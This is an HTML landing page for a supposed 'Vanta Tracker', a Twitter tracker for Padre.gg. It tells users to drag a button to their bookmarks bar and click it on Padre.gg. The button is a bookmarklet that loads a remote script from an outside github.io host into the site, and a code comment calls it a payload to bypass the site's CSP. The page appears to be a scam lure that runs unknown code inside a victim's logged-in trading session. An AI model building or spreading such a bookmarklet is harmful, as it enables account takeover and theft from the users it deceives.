<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg: #0a0a0a; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; overflow: hidden; }
        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; position: relative; z-index: 10; }
        canvas { position: absolute; top: 0; left: 0; z-index: 1; }
        h1 { color: var(--primary); font-size: 4rem; margin: 0; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
        .cta { background: var(--primary); color: #000; padding: 18px 40px; border-radius: 8px; font-weight: 800; text-decoration: none; margin-top: 30px; cursor: move; box-shadow: 0 0 15px var(--primary); }
        .instructions { margin-top: 20px; color: #aaa; font-size: 0.9rem; }
    </style>
</head>
<body>
    <canvas id="bg"></canvas>
    <div class="container">
        <h1>VANTA TRACKER</h1>
        <p>Zero-Latency Padre API Intelligence</p>
        <a href="#" class="cta" id="vanta-btn">VANTA TRACKER</a>
        <div class="instructions">Drag this button to your bookmarks bar, then click it on Padre.gg</div>
    </div>

    <script>
        // Simple Matrix-style Background
        const c = document.getElementById("bg");
        const ctx = c.getContext("2d");
        c.width = window.innerWidth; c.height = window.innerHeight;
        function draw() {
            ctx.fillStyle = "rgba(10,10,10,0.1)"; ctx.fillRect(0,0,c.width,c.height);
            requestAnimationFrame(draw);
        }
        draw();

        // BOOKMARKLET GENERATOR
        const url = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
        // Optimized payload to bypass site CSP
        const code = `javascript:(function(){var s=document.createElement('script');s.src='${url}?v='+Date.now();document.head.appendChild(s);})();`;
        document.getElementById('vanta-btn').href = code;
    </script>
</body>
</html>
